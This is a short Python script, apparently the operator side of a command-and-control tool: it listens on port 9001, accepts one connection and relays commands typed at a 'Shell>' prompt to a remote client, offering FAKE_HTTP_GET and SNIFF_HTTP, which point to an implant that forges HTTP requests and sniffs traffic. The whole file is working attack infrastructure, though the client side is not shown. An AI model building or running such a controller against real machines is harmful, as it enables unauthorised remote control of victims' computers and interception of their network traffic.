import socket

HOST = "192.168.1.78"
PORT = 9001

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST, PORT))
        server_socket.listen(1)
        print(f"Server is listening on {HOST}:{PORT}")

        c, addr = server_socket.accept()
        print(f"[+] {addr}")
        print("Commnds: FAKE_HTTP_GET, SNIFF_HTTP, EXIT")

        while True:
            cmd = input("Shell> ").strip()
            if not cmd:
                continue
            c.send(cmd.encode())

            if cmd.upper() == "EXIT":
                print("Exiting...")
                break

            response = c.recv(65535).decode(errors= "ignore")
            print(response)
       
        c.close()
        server_socket.close()

if __name__ == "__main__":
    start_server()